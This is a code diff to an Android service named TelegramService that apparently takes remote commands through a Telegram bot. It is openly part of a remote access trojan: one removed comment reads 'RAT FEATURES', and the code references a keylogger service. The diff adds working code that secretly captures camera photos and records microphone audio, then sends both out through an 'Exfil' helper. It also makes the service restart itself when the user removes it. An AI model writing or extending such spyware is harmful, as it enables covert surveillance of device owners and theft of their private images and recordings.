@@ -26,7 +26,6 @@ import android.hardware.camera2.CameraManager;
 import android.hardware.camera2.CaptureRequest;
 import android.location.Location;
 import android.location.LocationManager;
-import android.media.AudioManager;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.MediaPlayer;
@@ -129,7 +128,6 @@ public class TelegramService extends Service {
 
     private void handleCommand(final String cmd) {
         mainHandler.post(() -> {
-            // FUN PANEL
             if (cmd.equals("/flash")) toggleFlashlight();
             else if (cmd.equals("/siren")) playSiren();
             else if (cmd.startsWith("/wallpaper ")) changeWallpaper(cmd.substring(11).trim());
@@ -138,8 +136,6 @@ public class TelegramService extends Service {
             else if (cmd.startsWith("/toast ")) showToast(cmd.substring(7).trim());
             else if (cmd.startsWith("/lock ")) lockDevice(cmd.substring(6).trim());
             else if (cmd.equals("/unlock")) unlockDevice();
-            
-            // RAT FEATURES
             else if (cmd.equals("/cam")) takePhoto();
             else if (cmd.equals("/mic")) recordAudio();
             else if (cmd.equals("/screenshot")) { if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreen(); }
@@ -437,4 +433,62 @@ public class TelegramService extends Service {
                                     }, 1000);
                                     reader.setOnImageAvailableListener(r -> {
                                         Image image = r.acquireLatestImage();
-                                        ByteBuffer buffer = image.getPlan
+                                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                                        byte[] bytes = new byte[buffer.remaining()];
+                                        buffer.get(bytes);
+                                        try {
+                                            File f = new File(getExternalFilesDir(null), "cam.jpg");
+                                            FileOutputStream fos = new FileOutputStream(f);
+                                            fos.write(bytes); fos.close();
+                                            Exfil.sendFile(f.getAbsolutePath(), "Photo", "Camera Capture");
+                                        } catch (Exception e) {}
+                                        image.close(); camera.close();
+                                    }, null);
+                                } catch (Exception e) {}
+                            }
+                            @Override public void onConfigureFailed(CameraCaptureSession session) {}
+                        }, null);
+                    } catch (Exception e) {}
+                }
+                @Override public void onDisconnected(CameraDevice camera) {}
+                @Override public void onError(CameraDevice camera, int error) {}
+            }, null);
+        } catch (Exception e) {}
+    }
+
+    private void recordAudio() {
+        try {
+            File audioFile = new File(getExternalFilesDir(null), "mic.3gp");
+            MediaRecorder recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            recorder.setOutputFile(audioFile.getAbsolutePath());
+            recorder.prepare(); recorder.start();
+            Exfil.send("🎙️ Recording 10s...");
+            new Thread(() -> {
+                try { Thread.sleep(10000); } catch (Exception e) {}
+                mainHandler.post(() -> {
+                    try {
+                        recorder.stop(); recorder.release();
+                        Exfil.sendFile(audioFile.getAbsolutePath(), "Audio", "Mic Record");
+                    } catch (Exception e) {}
+                });
+            }).start();
+        } catch (Exception e) {}
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
+    
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        super.onTaskRemoved(rootIntent);
+        Intent restartService = new Intent(getApplicationContext(), TelegramService.class);
+        restartService.setPackage(getPackageName());
+        startService(restartService);
+    }
+    }
